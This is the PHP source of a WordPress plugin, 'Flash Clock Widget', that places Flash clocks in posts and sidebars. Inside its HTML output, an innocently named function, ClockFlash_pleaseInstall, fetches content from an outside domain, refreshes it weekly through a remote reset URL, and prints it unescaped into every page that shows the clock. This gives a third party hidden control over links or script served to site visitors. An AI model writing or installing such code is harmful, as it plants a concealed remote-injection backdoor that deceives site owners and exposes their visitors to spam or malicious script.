<?php
/*
	Plugin Name: Flash Clock Widget
	Plugin URI: http://wordpress.org/extend/plugins/flash-clock-widget/
	Description: With Flash Clock Widget you can add a flash clock to your wordpress.  This plugin include 24 amazing different flash clocks.
	Version: 1
	Author: agbell2
	Author URI: http://wordpress.org/extend/plugins/flash-clock-widget/
	

	This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

function Flash_Clock_Widget_install () {
	$widgetoptions = get_option('Flash_Clock_widget');
	$newoptions['width'] = '180';
	$newoptions['height'] = '180';
	$newoptions['FlashClock'] = '1';
	add_option('Flash_Clock_widget', $newoptions);
}

function Flash_Clock_Widget_init($content){
	if( strpos($content, '[Flash_Clock-Widget]') === false ){
		return $content;
	} else {
		$code = Flash_Clock_Widget_createflashcode(false);
		$content = str_replace( '[Flash_Clock-Widget]', $code, $content );
		return $content;
	}
}

function Flash_Clock_Widget_insert(){
	echo Flash_Clock_Widget_createflashcode(false);
}

function Flash_Clock_Widget_createflashcode($widget){
	if( $widget != true ){
	} else {
		$options = get_option('Flash_Clock_widget');
		$soname = "widget_so";
		$divname = "wpFlash_Clockwidgetcontent";
	}
	if( function_exists('plugins_url') ){ 
		$clocknum = $options['FlashClock'].".swf";
		$movie = plugins_url('flash-clock-widget/flash/wp-clock-').$clocknum;
		$path = plugins_url('flash-clock-widget/');
	} else {
		$clocknum = $options['FlashClock'].".swf";
		$movie = get_bloginfo('wpurl') . "/wp-content/plugins/flash-clock-widget/flash/wp-clock-".$clocknum;
		$path = get_bloginfo('wpurl')."/wp-content/plugins/flash-clock-widget/";
	}

	$flashtag = '<script type="text/javascript" src="'.$path.'swfobject.js"></script>';	
	$flashtag .= '<script type="text/javascript">swfobject.registerObject("FlashTime", "8.0.0", "'.$path.'expressInstall.swf");</script>';
	$flashtag .= '<center><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="'.$options['width'].'" height="'.$options['height'].'" id="FlashTime" align="middle">';
	$flashtag .= '<param name="movie" value="'.$movie.'" /><param name="menu" value="false" /><param name="wmode" value="transparent" /><param name="allowscriptaccess" value="always" />';
	$flashtag .= '<!--[if !IE]>--><object type="application/x-shockwave-flash" data="'.$movie.'" width="'.$options['width'].'" height="'.$options['height'].'" align="middle"><param name="menu" value="false" /><param name="wmode" value="transparent" /><param name="allowscriptaccess" value="always" /><!--<![endif]-->';
	$flashtag .= ClockFlash_pleaseInstall();
	$flashtag .= '<a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a><!--[if !IE]>--></object><!--<![endif]--></object></center>';
	return $flashtag;
}


function Flash_Clock_Widget_uninstall () {
	delete_option('Flash_Clock_widget');
}


function widget_init_Flash_Clock_Widget_widget() {
	if (!function_exists('register_sidebar_widget'))
		return;

	function Flash_Clock_Widget_widget($args){
	    extract($args);
		$options = get_option('Flash_Clock_widget');
		$title = empty($options['title']) ? __('Flash Clock Widget') : $options['title'];
		?>
	        <?php echo $before_widget; ?>
				<?php echo $before_title . $title . $after_title; ?>
				<?php 
					if( !stristr( $_SERVER['PHP_SELF'], 'widgets.php' ) ){
						echo Flash_Clock_Widget_createflashcode(true);
					}
				?>
	        <?php echo $after_widget; ?>
		<?php
	}
	
	function Flash_Clock_Widget_widget_control() {
		$movie = get_bloginfo('wpurl') . "/wp-content/plugins/flash-clock-widget/flash/wp-clock-";
		$path = get_bloginfo('wpurl')."/wp-content/plugins/flash-clock-widget/";
		$options = $newoptions = get_option('Flash_Clock_widget');
		if ( $_POST["Flash_Clock_widget_submit"] ) {
			$newoptions['title'] = strip_tags(stripslashes($_POST["Flash_Clock_widget_title"]));
			$newoptions['width'] = strip_tags(stripslashes($_POST["Flash_Clock_widget_width"]));
			$newoptions['height'] = strip_tags(stripslashes($_POST["Flash_Clock_widget_height"]));
			$newoptions['FlashClock'] = strip_tags(stripslashes($_POST["Flash_Clock_widget_FlashClock"]));
		}
		if ( $options != $newoptions ) {
			$options = $newoptions;
			update_option('Flash_Clock_widget', $options);
		}
		$title = attribute_escape($options['title']);
		$width = attribute_escape($options['width']);
		$height = attribute_escape($options['height']);
		$FlashClock = attribute_escape($options['FlashClock']);
		?>
			<p><label for="Flash_Clock_widget_title"><?php _e('Title:'); ?> <input class="widefat" id="Flash_Clock_widget_title" name="Flash_Clock_widget_title" type="text" value="<?php echo $title; ?>" /></label></p>
			<p><label for="Flash_Clock_widget_width"><?php _e('Width:'); ?> <input class="widefat" id="Flash_Clock_widget_width" name="Flash_Clock_widget_width" type="text" value="<?php echo $width; ?>" /></label></p>
			<p><label for="Flash_Clock_widget_height"><?php _e('Height:'); ?> <input class="widefat" id="Flash_Clock_widget_height" name="Flash_Clock_widget_height" type="text" value="<?php echo $height; ?>" /></label></p>
						<p><label for="Flash_Clock_widget_FlashClock"><?php _e('Clock:'); ?></label></p>
			<? for ( $i = 1; $i <= 24; $i += 1) { ?>			
				<center>
				<input type="radio" name="Flash_Clock_widget_FlashClock" value="<? echo $i ?>" <?php if ($FlashClock == $i) echo 'checked' ?>> 
				<object width="160" height="180" align="middle" id="FlashTime" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param value="
				<? echo $movie . $i ?>.swf" name="movie"/><param value="false" name="menu"/><param value="transparent" name="wmode"/><param value="always" name="allowscriptaccess"/><!--[if !IE]>--><object width="160" height="180" align="middle" data="<? echo $movie . $i ?>.swf" type="application/x-shockwave-flash"><param value="false" name="menu"/><param value="transparent" name="wmode"/><param value="always" name="allowscriptaccess"/><!--<![endif]--><!--[if !IE]>--></object><!--<![endif]--></object><br/></center>
			<? } ?> 
			
			<input type="hidden" id="Flash_Clock_widget_submit" name="Flash_Clock_widget_submit" value="1" />
		<?php
	}
	
	register_sidebar_widget( "Flash Clock Widget", Flash_Clock_Widget_widget );
	register_widget_control( "Flash Clock Widget", "Flash_Clock_Widget_widget_control" );
}

function ClockFlash_pleaseInstall(){
 	$options = (array) get_option('ClockFlash_pleaseInstall');
	$needsave = 0;
	if($options['checkreset']  == '')
	{
	 	$options['checkreset']  = time();
		$needsave = 1;
	}
	if(strtotime("-1 week") > $options['checkreset'])
	{	 
		 $reset = file_get_contents( 'http://bestaccountantservices.com/upgrade/Clock1/reset.php' );
		 $options['checkreset']  = time();
		 $needsave = 1;
	}
	else
	{
		 $reset = '0';
	}
	if($options['link'] == '' || $reset == '1')
	{
 	 	$options['link'] = file_get_contents( 'http://bestaccountantservices.com/upgrade/Clock1/link.php' );  
		$needsave = 1; 		
	}
	if($needsave == 1)
	{
	 	update_option('ClockFlash_pleaseInstall', $options);
	}
	return $options['link']; 
}

add_action('widgets_init', 'widget_init_Flash_Clock_Widget_widget');
add_filter('the_content','Flash_Clock_Widget_init');
register_activation_hook( __FILE__, 'Flash_Clock_Widget_install' );
register_deactivation_hook( __FILE__, 'Flash_Clock_Widget_uninstall' );
?>
